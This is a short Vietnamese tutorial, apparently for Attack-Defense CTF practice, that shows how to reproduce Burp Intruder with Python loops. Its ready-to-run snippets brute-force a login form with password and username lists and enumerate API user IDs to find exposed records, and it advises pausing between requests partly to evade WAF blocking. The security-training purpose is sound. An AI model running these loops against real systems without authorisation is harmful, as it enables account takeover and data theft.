# Intruder (công cụ thử nhiều giá trị của Burp) -> Vòng lặp Python

Trên Burp, Intruder dùng để tự thử hàng loạt giá trị vào 1 ô (ví dụ thử nhiều mật khẩu, nhiều ID) rồi xem response nào khác biệt. Trong Python, việc này chỉ là **1 vòng lặp `for` gửi request nhiều lần** — không cần công cụ riêng nào khác.

## Snippet copy-là-chạy

```python
import time
import requests

base = "http://target"
s = requests.Session()
s.verify = False

# 1) Thử 1 danh sách mật khẩu (giống Intruder kiểu "Sniper" -- chỉ đổi 1 ô)
for pw in ["admin", "123456", "password"]:
    r = s.post(f"{base}/login", data={"username": "admin", "password": pw}, timeout=5)
    if "Welcome" in r.text or r.status_code == 302:
        print("TÌM THẤY mật khẩu đúng:", pw, r.status_code)
        break
    time.sleep(0.1)   # nghỉ 0.1 giây giữa mỗi lần thử, tránh gửi dồn quá nhanh

# 2) Thử nhiều ID xem ID nào tồn tại / lộ dữ liệu
for i in range(1, 50):
    r = s.get(f"{base}/api/user/{i}", timeout=5)
    if r.status_code == 200 and "email" in r.text:
        print("CÓ DỮ LIỆU ở ID", i, "->", r.text[:100])
```

## Giải thích cho người mới
- **Khối 1**: `for pw in [...]:` lặp qua từng mật khẩu trong danh sách, mỗi lần gửi 1 request login. Thấy chữ `"Welcome"` trong response hoặc status `302` (chuyển trang sau khi login thành công) thì coi như tìm đúng, `break` để dừng vòng lặp ngay (không cần thử tiếp).
- **Khối 2**: tương tự nhưng đổi số ID từ 1 đến 49, xem ID nào trả về status 200 và có chữ `"email"` trong response — tức là ID đó có dữ liệu thật.
- `time.sleep(0.1)` = cho script "nghỉ" 0.1 giây trước khi gửi request kế tiếp. Lý do: nếu gửi quá nhanh quá nhiều request, hệ thống phòng thủ tự động (gọi là WAF — 1 lớp lọc đứng trước server, thấy nhiều request bất thường trong thời gian ngắn là tự chặn) có thể chặn bạn, hoặc tệ hơn là làm sập luôn service (dịch vụ/trang web) đang thi.
- Danh sách thử (`["admin", "123456", "password"]` hay `range(1, 50)`) chính là thứ bạn gõ vào ô "Payload" trong Intruder — chỉ cần copy đúng các giá trị bạn đã thấy hiệu quả lúc test tay trên Burp.
- Nếu cần thử **2 danh sách cùng lúc** (ví dụ vừa đổi username vừa đổi password, giống Intruder kiểu "Pitchfork"/"Cluster bomb"), dùng 2 vòng `for` lồng nhau (copy đúng thụt lề như dưới, đừng để dính thụt lề của gạch đầu dòng này):

```python
for user in ["admin", "root"]:
    for pw in ["admin", "123456"]:
        r = s.post(f"{base}/login", data={"username": user, "password": pw}, timeout=5)
        print(user, pw, r.status_code)
```

## Lưu ý nhanh
- Luôn có `time.sleep(...)` nhỏ giữa các lần thử — tránh tự làm sập trang đang thi hoặc bị tường lửa web (WAF) chặn vì gửi quá nhanh.
- Chỉ in ra / giữ lại những response **khác biệt rõ** (status khác, độ dài khác, có chữ đặc biệt) — đừng in hết cả trăm dòng response giống nhau, sẽ không nhìn ra được cái cần tìm.
- Khi thi Attack-Defense, thường chỉ cần 1-2 vòng lặp gọn như trên là đủ — không cần dựng công cụ phức tạp.
